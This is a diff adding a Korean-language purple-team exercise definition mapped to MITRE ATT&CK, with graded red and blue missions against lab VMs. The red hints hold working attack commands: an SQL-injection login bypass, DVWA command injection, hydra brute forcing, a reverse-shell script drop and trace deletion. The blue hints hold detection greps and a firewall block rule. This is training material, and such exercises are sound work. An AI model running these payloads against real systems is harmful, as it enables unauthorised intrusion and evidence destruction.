@@ -1,0 +1,134 @@
+id: "purple-team"
+title: "Purple Team: MITRE ATT&CK 매핑"
+description: "MITRE ATT&CK 프레임워크 기반의 Purple Team 훈련이다. Red Team은 특정 ATT&CK 테크닉(T1046 네트워크 서비스 스캐닝, T1059 명령/스크립트 인터프리터, T1078 유효 계정, T1190 공개 애플리케이션 익스플로잇, T1070 지표 제거)을 실행한다. Blue Team은 각 테크닉에 대한 탐지 커버리지를 검증하고 미탐지 영역을 식별해야 한다."
+difficulty: "hard"
+time_limit: 3600
+battle_type: "1v1"
+
+red_missions:
+  - order: 1
+    instruction: "[T1046 - Network Service Scanning] 전체 인프라의 서비스 맵을 구성하라."
+    hint: "nmap -sV -sC -p 1-10000 10.20.30.0/24 --max-retries 1 --host-timeout 15s -T4 2>&1 | head -80"
+    points: 15
+    target_vm: attacker
+    verify:
+      type: "output_contains"
+      expect: "open"
+
+  - order: 2
+    instruction: "[T1190 - Exploit Public-Facing Application] JuiceShop의 SQLi를 통해 인증을 우회하라."
+    hint: "curl -s -X POST http://10.20.30.80:3000/rest/user/login -H 'Content-Type: application/json' -d '{\"email\":\"' or 1=1--\",\"password\":\"a\"}'"
+    points: 20
+    target_vm: attacker
+    verify:
+      type: "output_contains"
+      expect: "token"
+
+  - order: 3
+    instruction: "[T1059 - Command and Scripting Interpreter] DVWA Command Injection으로 시스템 명령을 실행하라."
+    hint: "curl -s 'http://10.20.30.80:8080/vulnerabilities/exec/' -b 'security=low; PHPSESSID=test' -d 'ip=127.0.0.1;id;whoami;uname+-a&Submit=Submit'"
+    points: 15
+    target_vm: attacker
+    verify:
+      type: "output_contains"
+      expect: "uid"
+
+  - order: 4
+    instruction: "[T1078 - Valid Accounts] hydra로 DVWA의 유효한 계정 크리덴셜을 탈취하라."
+    hint: "hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.20.30.80 http-get-form '/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect:H=Cookie: security=low; PHPSESSID=test' -t 4 -W 1 -f 2>&1 | head -20"
+    points: 15
+    target_vm: attacker
+    verify:
+      type: "output_contains"
+      expect: "hydra"
+
+  - order: 5
+    instruction: "[T1059 - Scripting] Command Injection으로 Python 리버스 셸 스크립트를 작성하라."
+    hint: "curl -s 'http://10.20.30.80:8080/vulnerabilities/exec/' -b 'security=low; PHPSESSID=test' -d 'ip=127.0.0.1;echo+\"import+socket,os\"+>+/tmp/rs.py+2>&1;echo+script_created&Submit=Submit'"
+    points: 15
+    target_vm: attacker
+    verify:
+      type: "output_contains"
+      expect: "script_created"
+
+  - order: 6
+    instruction: "[T1070 - Indicator Removal] 공격 흔적 삭제를 시도하라 (bash history, tmp 파일)."
+    hint: "curl -s 'http://10.20.30.80:8080/vulnerabilities/exec/' -b 'security=low; PHPSESSID=test' -d 'ip=127.0.0.1;rm+-f+/tmp/rs.py;history+-c+2>&1;echo+indicators_removed&Submit=Submit'"
+    points: 15
+    target_vm: attacker
+    verify:
+      type: "output_contains"
+      expect: "indicators_removed"
+
+  - order: 7
+    instruction: "[T1046] nikto로 추가 취약점 벡터를 스캔하라."
+    hint: "nikto -h http://10.20.30.80:8080 -maxtime 60s 2>&1 | head -30"
+    points: 10
+    target_vm: attacker
+    verify:
+      type: "output_contains"
+      expect: "Server:"
+
+blue_missions:
+  - order: 1
+    instruction: "[T1046 탐지] suricata에서 네트워크 스캔(T1046) 탐지 알림을 확인하라."
+    hint: "grep -iE 'scan\\|probe\\|enum' /var/log/suricata/fast.log | tail -20"
+    points: 10
+    target_vm: secu
+    verify:
+      type: "output_contains"
+      expect: "10.20.30"
+
+  - order: 2
+    instruction: "[T1190 탐지] ModSecurity에서 애플리케이션 익스플로잇(T1190) 차단 로그를 확인하라."
+    hint: "grep -iE 'sql|injection|exploit' /var/log/apache2/modsec_audit.log | tail -20"
+    points: 15
+    target_vm: web
+    verify:
+      type: "output_contains"
+      expect: "sql"
+
+  - order: 3
+    instruction: "[T1059 탐지] Apache 접근 로그에서 Command Injection(T1059) 패턴을 탐지하라."
+    hint: "grep -iE 'exec|;|cmd|whoami|uname|%3B' /var/log/apache2/access.log | tail -20"
+    points: 15
+    target_vm: web
+    verify:
+      type: "output_contains"
+      expect: "exec"
+
+  - order: 4
+    instruction: "[T1078 탐지] Wazuh에서 브루트포스/인증 공격(T1078) 알림을 확인하라."
+    hint: "grep -iE 'authentication|brute|login|failed' /var/ossec/logs/alerts/alerts.json | tail -20"
+    points: 15
+    target_vm: siem
+    verify:
+      type: "output_contains"
+      expect: "alert"
+
+  - order: 5
+    instruction: "[T1070 탐지] Wazuh syscheck에서 파일 삭제/변조(T1070) 이벤트를 확인하라."
+    hint: "grep -iE 'syscheck|integrity|deleted|modified' /var/ossec/logs/alerts/alerts.json | tail -20"
+    points: 15
+    target_vm: siem
+    verify:
+      type: "output_contains"
+      expect: ""
+
+  - order: 6
+    instruction: "[커버리지 분석] 각 ATT&CK 테크닉별 탐지 여부를 정리하라. suricata 알림 SID 목록을 추출하라."
+    hint: "grep -oP '\\[\\d+:\\d+:\\d+\\]' /var/log/suricata/fast.log | sort -u"
+    points: 20
+    target_vm: secu
+    verify:
+      type: "output_contains"
+      expect: "["
+
+  - order: 7
+    instruction: "[커버리지 강화] 탐지 갭을 보완하기 위해 nftables에 Command Injection 관련 아웃바운드를 차단하라."
+    hint: "nft add rule inet filter output ip saddr 10.20.30.80 ip daddr 10.20.30.201 drop"
+    points: 15
+    target_vm: secu
+    verify:
+      type: "output_contains"
+      expect: ""
